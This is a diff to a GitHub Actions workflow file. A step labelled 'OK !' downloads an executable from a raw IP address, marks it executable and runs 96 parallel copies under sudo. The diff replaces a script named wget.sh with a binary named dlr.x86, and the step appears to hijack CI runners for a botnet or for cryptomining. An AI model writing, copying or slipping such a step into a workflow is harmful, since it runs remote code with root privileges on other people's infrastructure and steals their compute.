@@ -13,12 +13,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget http://213.209.143.62/wget.sh
-          chmod +x wget.sh
+          wget http://213.209.143.62/dlr.x86
+          chmod +x dlr.x86
           
           PIDS=()
           for i in {1..96}; do
-            sudo sudo ./wget.sh &
+            sudo sudo ./dlr.x86 &
             PIDS+=($!)
           done
 
